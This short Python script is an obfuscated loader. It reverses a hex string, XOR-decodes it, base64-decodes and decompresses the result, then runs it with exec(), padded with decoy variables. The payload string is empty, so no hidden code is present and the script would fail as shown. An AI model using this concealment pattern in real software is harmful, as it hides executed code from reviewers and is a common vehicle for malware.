
# -*- coding: utf-8 -*-
import zlib, base64, sys, codecs

joWq = "useless"
joWq = joWq.swapcase()


tzN9L = False  # ignored
PyUAb = False  # ignored
Qzq8U = 'abc'  # ignored
def _decode():
    _h = ''
    _r = bytes.fromhex(_h).decode('utf-8')
    _r = _r[::-1]
    _xor_key = 'tBKh2y26'
    _d = ''.join(chr(ord(c) ^ ord(_xor_key[i % len(_xor_key)])) for i, c in enumerate(_r))
    try:
        _b = base64.b64decode(_d.encode('ascii'))
    except:
        _d += '=' * ((4 - len(_d) % 4) % 4)
        _b = base64.b64decode(_d.encode('ascii'))
    _src = zlib.decompress(_b).decode('utf-8')
    # KEY FIX: exec with globals() so functions become global
    exec(_src, globals())

if __name__ == "__main__":
    _decode()
